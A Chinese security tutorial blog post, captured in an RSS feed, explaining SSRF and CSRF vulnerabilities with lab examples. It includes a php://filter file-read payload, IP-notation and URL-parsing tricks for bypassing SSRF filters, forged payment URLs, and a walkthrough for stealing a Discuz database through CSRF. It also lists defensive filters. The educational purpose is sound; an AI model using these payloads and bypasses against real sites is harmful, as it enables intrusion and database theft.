<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>关于SSRF与CSRF漏洞的解释 - 白蚁先生</title>
<link>http://www.cnblogs.com/jeromeyoung/p/14286997.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jeromeyoung/p/14286997.html</guid>
<description>&lt;p&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）&lt;/p&gt;
&lt;p&gt;其实也就相当于一个中间人攻击（&lt;strong&gt;主要目的就是：由外网攻击者利用SSRF漏洞攻击内网&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一般来说基本都是通过脚本去扫内网的ip、端口点到为止&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;1、ssrf形成原因&quot;&gt;1、SSRF形成原因&lt;/h2&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。&lt;/p&gt;
&lt;p&gt;即也就是说服务器端的验证并没有对其请求如获取图片的参数（image=）做出严格的过滤以及限制，从而导致A网站可以从其他服务器的获取数据&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191448116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（默认网站webserver192.168.1.5的参数指定访问内网中的某台机器的内部资源地址，如果没有对其指定地址严格限制，那么就可能造成由webserver192.168.1.5这太机器访问内部的任意一台机器的资源。）——&amp;gt;&amp;gt;如：www.xxx.com/xx.php?image=URL，一般像分享、在线翻译这些功能地址。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;即我们要对目标网站的架构了解，脑子了要有一个架构图。比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;主要标志就是：xx.php?url=.....&lt;/p&gt;
&lt;p&gt;(也可以命令执行，需要条件。甚至脚本执行。。。。)&lt;/p&gt;
&lt;h2 id=&quot;2、利用ssrf漏洞的目的&quot;&gt;2、利用SSRF漏洞的目的&lt;/h2&gt;
&lt;p&gt;SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。&lt;/p&gt;
&lt;h2 id=&quot;3、ssrf漏洞的用途&quot;&gt;3、SSRF漏洞的用途&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;可以对外网服务器所指向的内网、服务器本地进行端口扫描，获取一些服务的banner信息&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击运行在内网或服务器本地的应用程序（比如溢出）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;对内网web应用进行指纹识别，通过访问默认文件实现&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;利用file协议读取本地文件等&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;4、ssrf漏洞的特性&quot;&gt;4、SSRF漏洞的特性&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;SSRF的强大和成功几率由函数本身功能决定&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;即代码中是什么函数其功能有多强大，那么存在SSRF漏洞的话，漏洞利用的概率和影响力就有多大。比如下面的两个函数curl_init、file_get_contents：一个能达到执行脚本的地步，一个能达到读文件的地步。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;实例&quot;&gt;实例&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;对于curl_init函数&lt;/strong&gt;，利用这个远程包含的特性，使用端口扫描脚本http://192.168.18.62:86/bwapp/evil/ssrf-1.txt去扫描内网ip开放的端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191509673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：这里为什么txt被执行了，因为这里有个包含漏洞才执行了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对于file_get_content函数：(不支持https，支持http，支持php://内置协议）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;读文件需要base64编码（php://filter/read=convert.base64-encode/resource=xxx.php）&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;http://192.168.18.23/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=../../index.php
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191519498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里我得总结一下，上面为什么我需要用文件包含去实现我SSRF的目的？，而且为什么要用内置函数去读文件？，如果是这样我直接用文件包含不就行了么，简直跟我文件包含没有任何区别嘛。&lt;/p&gt;
&lt;p&gt;其实这里文件包含是文件包含，SSRF是SSRF，二者之间是本质的不同，一个主要目的是包含文件，一个主要目的是通过中间服务器探测内网信息，这里只是借助了文件包含的能力举得例子，实际的例子多得很并不都涉及到文件包含，并不能混淆。就好比文件上传利用文件包含开启一句话一样。&lt;/p&gt;
&lt;p&gt;以上只是对两个实例的说明。&lt;/p&gt;
&lt;p&gt;其本质是：文件包含了站点web服务器上的东西，而ssrf的目的是打进内网，搞内网的东西。&lt;/p&gt;
&lt;p&gt;不懂可以去wooyun看例子，&lt;strong&gt;ssrf是借助站点web服务器进入内网进行信息搜集。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;5、如何挖掘ssrf漏洞&quot;&gt;5、如何挖掘SSRF漏洞&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;分享：通过URL地址分享网页内容&lt;/li&gt;
&lt;li&gt;转码服务&lt;/li&gt;
&lt;li&gt;在线翻译&lt;/li&gt;
&lt;li&gt;图片加载与下载：通过URL地址加载或下载图片&lt;/li&gt;
&lt;li&gt;图片、文章收藏功能&lt;/li&gt;
&lt;li&gt;未公开的api实现以及其他调用URL的功能&lt;/li&gt;
&lt;li&gt;从URL关键字中寻找&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;blockquote readability=&quot;4&quot;&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;share&lt;br/&gt;wap&lt;br/&gt;url&lt;br/&gt;link&lt;br/&gt;src&lt;br/&gt;source&lt;br/&gt;target&lt;br/&gt;u&lt;br/&gt;3g&lt;br/&gt;display&lt;br/&gt;sourceURl&lt;br/&gt;imageURL&lt;br/&gt;domain&lt;br/&gt;...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;6、常用ssrf去做什么事&quot;&gt;6、常用SSRF去做什么事&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;利用执行脚本进行端口探测&lt;/li&gt;
&lt;li&gt;任意地址访问&lt;/li&gt;
&lt;li&gt;内网访问&lt;/li&gt;
&lt;li&gt;任意文件读取&lt;/li&gt;
&lt;li&gt;内网攻击&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;7、绕过方法（绕开一般ssrf的防护）&quot;&gt;7、绕过方法（绕开一般ssrf的防护）&lt;/h2&gt;
&lt;h4 id=&quot;1、更改ip地址写法&quot;&gt;&lt;strong&gt;1&lt;/strong&gt;、&lt;strong&gt;更改IP地址写法&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$

^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$

^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对于这种过滤我们可以采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址我们可以改写成：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;(1)、8进制格式：0300.0250.0.1

(2)、16进制格式：0xC0.0xA8.0.1

(3)、10进制整数格式：3232235521

(4)、16进制整数格式：0xC0A80001

还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;2、利用解析url所出现的问题&quot;&gt;2、利用解析URL所出现的问题&lt;/h4&gt;
&lt;p&gt;在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;http://www.Jeromeyoung.com@192.168.0.1/
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.Jeromeyoung.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.Jeromeyoung.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。&lt;/p&gt;
&lt;h2 id=&quot;8、防护ssrf措施&quot;&gt;8、防护SSRF措施&lt;/h2&gt;
&lt;p&gt;（1）（黑名单）过滤10.0.0.0/8 、172.16.0.0/12、192.168.0.0/16、localhost私有地址、IPv6地址&lt;/p&gt;
&lt;p&gt;（2）（黑名单）过滤file:///、dict://、gopher://、ftp:// 危险schema&lt;/p&gt;
&lt;p&gt;（3）使用地址白名单&lt;/p&gt;
&lt;p&gt;（4）内网服务开启鉴权（Memcached, Redis, Elasticsearch and MongoDB）&lt;/p&gt;
&lt;p&gt;（5）对回显内容进行识别，采取限制措施&lt;/p&gt;
&lt;p&gt;（6）需要使用互联网资源（比如贴吧使用网络图片）而无法使用白名单的情况：首先禁用 CURLOPT_FOLLOWLOCATION；然后通过域名获取目标ip，并过滤内部ip；最后识别返回的内容是否与假定内容一致&lt;/p&gt;

&lt;p&gt;Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为&quot;one click&quot;攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。&lt;/p&gt;
&lt;h2 id=&quot;1、csrf攻击原理&quot;&gt;1、CSRF攻击原理&lt;/h2&gt;
&lt;p&gt;程序员开发的时候，未对相关页面进行token和referer判断，造成攻击者可构造自己的URL地址欺骗目标用户进行点击。（点击后因为未对相关页面进行token和referer判断，即链接中没得带token或者数据包中没得referer这类的操作，所以链接地址没得校验操作直接执行了）&lt;strong&gt;其实也就是像下面的重要页面的防范措施没有做到位&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以例子进行说明：&lt;/p&gt;
&lt;blockquote readability=&quot;32.500214132762&quot;&gt;
&lt;p&gt;当我们打开网站或者登陆某个网站后，就会产生一个会话(这里指用户登陆后)，这个会话可能是SESSION，Cookie控制，但是这是无关紧要的。唯一的重点是浏览器与服务器之间是在会话之中，在这个会话没有结束时候，你可以利用你的权限对网站进行操作，如进行发表文章，发邮件，删除文章等操作。当这个会话结束后，你在进行某些操作时候Web应用程序通常会来提醒你，您的会话已过期，或者是请重新登陆等提示。&lt;/p&gt;
&lt;p&gt;这非常好理解，就像我们登陆网上银行后，Web浏览器已经跟可信的站点建立了一个经认证的会话。之后，只要是通过该Web浏览器这个认证的会话所发送的请求，都被视为可信的动作，例如转账，汇款等操作。当我们在一段时间内不进行操作后，在来重新做转账，或者汇款操作，那么这个站点可能会提示你：您的身份已过期，请重新登陆或者会话结束等消息。&lt;/p&gt;
&lt;p&gt;而CSRF攻击则是建立会话之上的攻击。比如当你登陆了网上银行，正在进行转账业务，这时你的某个QQ好友（攻击者）发来一条消息(URL)，这条消息是攻击者精心构造的转账业务代码。而且与你所登录的网站是同一个银行，你可能认为这个网站是安全的，并不是什么钓鱼网站之类的，然后打开了这条URL，那么你的账户的钱可能就在你的这一次小小点击上全部丢失。&lt;/p&gt;
&lt;p&gt;怎么可能这么神奇呢？其实这并不神奇。主要是因为你的浏览器正处于与此网站的会话之中，那么一些操作都是合法的，而入侵者构造的这段代码只不过是正常的转账操作代码而已。比如说你想给用户spisec转账1000元，那么点击提交按钮之后，可能会发送以下请求：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.taobao.com/pay.jsp?user=spisec&amp;amp;money=1000&quot; target=&quot;_blank&quot;&gt;http://www.taobao.com/pay.jsp?user=spisec&amp;amp;money=1000&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而攻击者仅仅是改变一下user参数与money参数即可完成一次“合法”的攻击，如：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.taobao.com/pay.jsp?user=hack&amp;amp;money=10000&quot; target=&quot;_blank&quot;&gt;http://www.taobao.com/pay.jsp?user=hack&amp;amp;money=10000&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;当你访问了这条URL之后，就会自动向hack这个账户里面转入10000元。而这是你亲手造成的，并没因为有人去破解你的密码或者是Web服务器被入侵所导致的你的金钱丢失。下面以CSRF攻击原理图给大家形象总结:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191718827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ol readability=&quot;4.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;h2 id=&quot;2、达成csrf攻击的条件&quot;&gt;2、达成CSRF攻击的条件&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;攻击建立在浏览器与Web服务器的会话之中&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;会话期间需要受害者进行访问或者说是点击&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;如果以上任意一个不满足都不能达成跨站请求伪造攻击。&lt;strong&gt;即目标必须处于会话状态，且需要点击&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;说白了，CSRF攻击也就是所谓的钓鱼攻击。&lt;/p&gt;
&lt;h2 id=&quot;3、csrf分类&quot;&gt;3、CSRF分类&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;站内&lt;/li&gt;
&lt;li&gt;站外&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;4、检测方法&quot;&gt;4、检测方法&lt;/h2&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;burp&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CSRF Request Builder&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CSRFTester&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;工具检测的原理：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;5、如何挖掘csrf漏洞&quot;&gt;5、如何挖掘CSRF漏洞&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;扫描器(注意并不是每个页面爆没有token漏洞都是对的，因为前端的进行CSRF有毛用，主要就是对后台管理那一层的，所以不要盲目认为。)，&lt;/li&gt;
&lt;li&gt;修改密码的地方&lt;/li&gt;
&lt;li&gt;添加用户的地方&lt;/li&gt;
&lt;li&gt;数据库备份的地方&lt;/li&gt;
&lt;li&gt;数据交易、支付等&lt;/li&gt;
&lt;li&gt;其他一些对话框的钓鱼页面&lt;/li&gt;
&lt;li&gt;CSRF一般与XSS结合使用&lt;/li&gt;
&lt;li&gt;注意页面是否带token或者包中有没得Referer，Referer在包中删除是否依然可以访问url目标等。光靠一个Referer来说也没用，Referer也能伪造&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;注意可能有预测的token，即有规律的token，如果是随机的就放弃吧。&lt;/p&gt;
&lt;h2 id=&quot;6、常用攻击手段实例&quot;&gt;6、常用攻击手段实例&lt;/h2&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;&lt;strong&gt;一般的攻击思路&lt;/strong&gt;：（首先，开源的web源码，攻击者了解网站的框架，搭建环境构造攻击url，例如数据备份的，下面实验中有过程。&lt;/p&gt;
&lt;p&gt;去目标网站创建普通用户，发帖插入url等待目标管理会话在线状态浏览帖子，中招，攻击者访问备份下来的数据库，脱裤，完事。&lt;/p&gt;
&lt;p&gt;）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;1）、dz网站数据库备份（快速脱库）&quot;&gt;1）、dz网站数据库备份（快速脱库）&lt;/h3&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;两个ip：192.168.18.56:82攻击者自己的ip、192.168.18.62:86管理员的ip&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;整体思路：&lt;/p&gt;
&lt;blockquote readability=&quot;13&quot;&gt;
&lt;p&gt;实验步骤：攻击者自己搭建环境，以管理员身份登录，创建普通账户，以管理员身份进行数据备份，抓包，修改包的post数据，构造url为自己要求的。（这里url的IP地址为目标的IP地址）&lt;/p&gt;
&lt;p&gt;复制好url，前往目标网站，注册，以普通用户身份登录发帖带入url（&lt;strong&gt;试一下直接在文本中插入，按道理来说需要自动运行地址而不是文本内容&lt;/strong&gt;），等待管理员登录且为会话状态点击查看攻击者发帖的内容，达成指定备份。&lt;/p&gt;
&lt;p&gt;攻击者访问构造的url，脱库。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;攻击者环境配置url（创建账号忽略，直接上关键步骤）：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191735821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;原本应该这是样的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2021011619174555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191755193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当攻击者重构备份的文件夹名称和文件名的时候：&lt;/p&gt;
&lt;p&gt;注意：这里构造是抓到包的时候抓了改，再放包，不是重发器里发一次。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191808954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191818845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191829502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;找到攻击url，构造成目标的地址：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;http://192.168.18.62:86/dz/upload/uc_server/admin.php?m=db&amp;amp;a=operate&amp;amp;t=export&amp;amp;appid=0&amp;amp;backupdir=Jerome%26backupfilename%3Dtest
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在目标网站上创建用户、发帖。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191841700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;发帖成功：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191849621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;现在当管理员登录之后查看帖子，会发现是正常的帖子：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191900370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2021011619190822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当管理员在线且点击了这篇帖子，结果就是数据库已经达成了备份，且能被攻击者访问。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191915257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;这里得说明一下这个路径，在上面攻击者搭建的环境中，一定会去模拟攻击才知道最后的结果在哪个路径下，上面省却了这个步骤，这里直接在目标机器上看结果。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191927159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;2）、修改密码&quot;&gt;2）、修改密码&lt;/h3&gt;
&lt;p&gt;修改密码的前提是：利用CSRF漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;以dvwa的低级为例，直接抓包：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210116191936941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phY2swNjEw,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
